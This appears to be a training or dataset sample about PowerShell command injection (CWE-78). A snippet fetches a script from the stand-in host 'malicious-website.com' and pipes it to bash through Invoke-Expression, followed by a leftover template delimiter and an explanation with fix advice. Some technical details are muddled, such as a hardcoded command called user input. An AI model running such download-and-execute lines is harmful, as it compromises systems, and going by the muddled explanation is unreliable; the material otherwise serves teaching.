$command = "curl -o C:\Users\User\Documents\10secondmoments.txt https://malicious-website.com/malicious-script.sh | bash"
Invoke-Expression $command

/*"""DELIMITER
```powershell
|CODE|```

This PowerShell code snippet is vulnerable to OS Command Injection (CWE-78) due to the use of user input `$command` directly within the `Invoke-Expression` cmdlet without proper validation or sanitization.

**How the vulnerability works:**
An attacker can manipulate the contents of the `$command` variable to inject additional OS commands to be executed in the context of the PowerShell session. This could lead to unauthorized access, data exfiltration, system compromise, and other malicious activities.

**How it could be exploited:**
An attacker could modify the content of the `$command` variable to download and execute a malicious script from their own server, effectively compromising the system hosting this application.

**How to fix the vulnerability:**
To mitigate OS Command Injection vulnerability, it's essential to avoid executing user-controlled input as OS commands directly. Instead, use safe methods provided by the programming language to execute commands or validate/sanitize user input to prevent malicious injection.

In this case, the code should be rewritten to avoid direct execution of user-controlled input:
1. Use PowerShell cmdlets or methods to download files securely without executing arbitrary commands.
2. Implement input validation to restrict the characters and commands that can be injected, ensuring that only allowed commands can be executed.
3. Consider utilizing safe approaches like parameterized queries or proper escaping to prevent command injection vulnerabilities.

Always treat user-generated or external input as untrusted data and validate/sanitize it before using it in commands or queries to prevent security vulnerabilities.